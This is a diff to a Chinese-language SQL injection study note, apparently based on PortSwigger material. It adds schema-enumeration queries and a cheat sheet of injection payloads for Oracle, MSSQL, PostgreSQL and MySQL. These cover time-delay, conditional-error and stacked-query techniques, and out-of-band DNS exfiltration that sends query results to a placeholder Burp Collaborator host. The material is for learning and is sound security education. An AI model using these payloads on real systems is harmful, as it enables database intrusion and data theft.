@@ -208,9 +208,9 @@ SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT use
 
 在确定SQL注入存在时，获取数据库信息是目标之一，便于后续操作。
 
-可以查询版本信息
+#### 可以查询版本信息
 
-| Oracle     | `SELECT banner FROM v$versionSELECT version FROM v$instance` |
+| Oracle     | `SELECT banner FROM v$version       SELECT version FROM v$instance` |
 | :--------- | ------------------------------------------------------------ |
 | Microsoft  | `SELECT @@version`                                           |
 | PostgreSQL | `SELECT version()`                                           |
@@ -221,4 +221,124 @@ SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT use
 ```sql
 SELECT * FROM information_schema.tables
 ```
+
+#### 获取数据库的列和表信息
+
+| Oracle     | `SELECT * FROM all_tables         SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| :--------- | ------------------------------------------------------------ |
+| Microsoft  | `SELECT * FROM information_schema.tables        SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| PostgreSQL | `SELECT * FROM information_schema.tables         SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| MySQL      | `SELECT * FROM information_schema.tables         SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+
+#### 列出数据库内容
+
+除Oracle数据库，都有一组成为information schema的视图，用于提供数据库信息。
+
+```sql
+SELECT * FROM information_schema.tables
+```
+
+返回如下所示的输出
+
+![image-20220114225259872](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220114225259872.png)
+
+表示有三个表，同时可以查询各列信息
+
+```sql
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
+
+![image-20220114225404909](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220114225404909.png)返回表中的各列及类型
+
+## SQL注入小抄
+
+### 字符串连接
+
+| Oracle     | `'foo'||'bar'`                                               |
+| :--------- | ------------------------------------------------------------ |
+| Microsoft  | `'foo'+'bar'`                                                |
+| PostgreSQL | `'foo'||'bar'`                                               |
+| MySQL      | `'foo' 'bar'` [Note the space between the two strings] `CONCAT('foo','bar')` |
+
+### 字符串提取
+
+| Oracle     | `SUBSTR('foobar', 4, 2)`    |
+| :--------- | --------------------------- |
+| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
+| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
+| MySQL      | `SUBSTRING('foobar', 4, 2)` |
+
+### 截断查询
+
+| Oracle     | `--comment`                                                  |
+| :--------- | ------------------------------------------------------------ |
+| Microsoft  | `--comment/*comment*/`                                       |
+| PostgreSQL | `--comment/*comment*/`                                       |
+| MySQL      | `#comment` `-- comment` [Note the space after the double dash] `/*comment*/` |
+
+### 数据库版本
+
+| Oracle     | `SELECT banner FROM v$versionSELECT version FROM v$instance` |
+| :--------- | ------------------------------------------------------------ |
+| Microsoft  | `SELECT @@version`                                           |
+| PostgreSQL | `SELECT version()`                                           |
+| MySQL      | `SELECT @@version`                                           |
+
+### 数据库内容
+
+| Oracle     | `SELECT * FROM all_tablesSELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| :--------- | ------------------------------------------------------------ |
+| Microsoft  | `SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| PostgreSQL | `SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| MySQL      | `SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+
+### 条件判断
+
+| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual` |
+| :--------- | ------------------------------------------------------------ |
+| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
+| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END` |
+| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |
+
+### 批处理或堆栈查询
+
+| Oracle     | `Does not support batched queries.` |
+| :--------- | ----------------------------------- |
+| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE`        |
+| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`        |
+| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`        |
+
+使用MySQL，批处理查询通常不能用于SQL注入。但是，如果目标应用程序使用某些 PHP 或 Python API 与 MySQL 数据库进行通信，则偶尔会发生这种情况。
+
+### 时延
+
+| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
+| :--------- | ------------------------------------- |
+| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
+| PostgreSQL | `SELECT pg_sleep(10)`                 |
+| MySQL      | `SELECT sleep(10)`                    |
+
+### 条件判断时延
+
+| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
+| :--------- | ------------------------------------------------------------ |
+| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`            |
+| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
+| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`               |
+
+### DNS解析
+
+| Oracle     | The following technique leverages an XML external entity ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence: `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`  The following technique works on fully patched Oracle installations, but requires elevated privileges: `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')` |
+| :--------- | ------------------------------------------------------------ |
+| Microsoft  | `exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'` |
+| PostgreSQL | `copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'` |
+| MySQL      | The following techniques work on Windows only: `LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')` `SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |
+
+### 数据泄露的DNS查找
+
+| Oracle     | `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual` |
+| :--------- | ------------------------------------------------------------ |
+| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"')` |
+| PostgreSQL | `create OR replace function f() returns void as $$declare c text;declare p text;beginSELECT into p (SELECT YOUR-QUERY-HERE);c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';execute c;END;$$ language plpgsql security definer;SELECT f();` |
+| MySQL      | The following technique works on Windows only: `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |
 
